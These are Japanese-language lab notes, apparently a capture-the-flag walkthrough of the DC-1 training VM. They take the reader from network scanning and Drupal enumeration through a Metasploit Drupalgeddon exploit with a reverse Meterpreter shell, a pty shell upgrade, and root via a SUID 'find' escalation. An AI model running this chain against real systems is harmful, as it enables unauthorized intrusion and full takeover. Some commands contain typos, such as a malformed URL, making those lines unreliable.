1.IPアドレスを調べる
```bash
sudo ifconfig
```
2.DC-1マシンのIPアドレスを特定する<br>※Pingスイープ：端末が存在するかどうかを調べるために、Pingで広域スキャンすること
```bash
sudo fping -aqg 192.168.56.0/24
```
3.特定したIPアドレスを環境変数に設定する<br>※何度も使うから
```bash
export IP=192.168.56.103
```
4.ポートスキャンする
```bash
nmap -sC -sV -p 1-65535 $IP
```
## スキャンの結果から
| 項目 | 内容 |
|------|------|
| TargetIP | 192.168.56.103 |
| TargetPort | 22(TCP)<br>80(http)<br>111(RPCBIND)<br>3306(MySQL) |

5.HTTPサービスにアクセス※ブラウザで
```
http://192.168.56.103/
```
6.よく使われる"robots.txt"ファイルにアクセス※ブラウザにて
```
http://192.168.56.103/robots.txt
```
  - Disallow: /MAINTAINERS.txt　←注目<br>									
Disallwフィールドはクローラー（検索エンジンのデータベース作成に用いられる巡回プログラム）による巡回を拒否するものだが、ブラウザからアクセス可能
7.URLを環境変数に設定する
```
export URL="http://:80$IP/"
```
8.Webサービスでスキャン
- NATに切り替えてdroopscanをインストール
  ```
  python3 -m venv myenv									
  source myenv/bin/activate									
  pip install droopescan
  ```
- ホストオンリーに切り替えてDC-1マシンをスキャン
  ```
  droopescan scan drupal -u $URL
  ```
9.Drupal用のExploitを探す※ブラウザで
  ```
  https://www.exploit-db.com/exploits/35150
  ```
  - Drupal 7 remote		→検索<br>						
脆弱性の名前として「Drupalgeddon」をメモ<br>	
→Drupal のSQLインジェクションの脆弱性の通称

10.MetasploitでDrupalgeddonを狙う
```
msfconsole									
# [msf](Jobs:0 Agents:0) >> search type:exploit drupal									
# [msf](Jobs:0 Agents:0) >> use exploit/multi/http/drupal_drupageddon
# [] No payload configured, defaulting to php/meterpreter/reverse_tcp
  ➢リバース型のペイロードがセットされた
    ※今回の実験ではRHOST、RPORT、TARGETURIを設定（RHOST以外はデフォルトでOK）
# [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set RHOSTS 192.168.56.103									
[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> show options
  ➢LHOSTが127.0.0.1だとExploitの攻撃が成功してもペイロードの接続先がloclhostになってしまい、ターゲット端末そのものになるため変更
# [msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> set LHOST 192.168.56.101
```
11.Exploitモジュール実行
```
[msf](Jobs:0 Agents:0) exploit(multi/http/drupal_drupageddon) >> run
```
- MeterpreterプロンプトからMeterpreterに用意されたコマンドが使用可能になる	<br>							
例） $ls<br>									
ユーザー権限で閲覧できるようなファイルにもヒントが書かれていることがある
```
(Meterpreter 1)(/var/www) > cat flag1.txt
```
12.Meterpreterセッションからシェルに切り替え
```
(Meterpreter 1)(/var/www) > shell
```
```
id									
uid=33(www-data) gid=33(www-data) groups=33(www-data)
➢www-dataユーザーであることが分かった
```
13.対話的シェルを奪取する
```
which python ←入力							
/usr/bin/python ←結果							
python -c 'import pty; pty.spawn("/bin/bash")' ←入力				
www-data@DC-1:/var/www$ ←結果						
www-data@DC-1:/var/www$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/usr/games:/tmp ←パスを追加する
www-data@DC-1:/home$ alias ll='ls -la --color=auto'
llコマンドで色をつけてファイルを列挙できるようにする
```
14.OSを特定する
- システム内に簡単に攻められる脆弱性が見つからない場合、カーネルベースの脆弱性を突いて権限の昇格を狙う
```
www-data@DC-1:/$ uname -a									
Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux									
www-data@DC-1:/$ cat /etc/-release → Debian　バージョン７		
www-data@DC-1:/$ cat /etc/issue
```
15.システム内を探索する
```
www-data@DC-1:/home$ ll									
rwxr-xr-x  3 root  root  4096 Feb 19  2019 .									
drwxr-xr-x 23 root  root  4096 Feb 19  2019 ..									
drwxr-xr-x  2 flag4 flag4 4096 Feb 19  2019 flag4					→見てみる
```
16.一時ファイルの置き場所を調べる
- 今回の一時ファイルの定義
  - プログラムの実行中に一時的に必要に萎えるデータやプログラム間のデータの受け渡しに使われるファイル
  - /tmpと/dev/shmが候補
```
www-data@DC-1:/var/tmp$ cd /dev/shm									
www-data@DC-1:/var/tmp$ cd /tmp
```

17.SUIDファイルを検索（定石）
```
www-data@DC-1:/$ find / -perm -u=s -type f 2> /dev/null
```
18.Findコマンドを利用してシェルを奪う
- GTFOBins ⇒　https://gtfobins.githb.io :シェルを奪うコマンド例を調べられる
```
www-data@DC-1:/$ which find									
www-data@DC-1:/$ /usr/bin/find . -exec /bin/bash -p \; -quit
```

# bash-4.2# 	←管理者権限のプロンプトが返ってくる
```
19.フラグファイルを開く

![kekka](images/kekka.png)
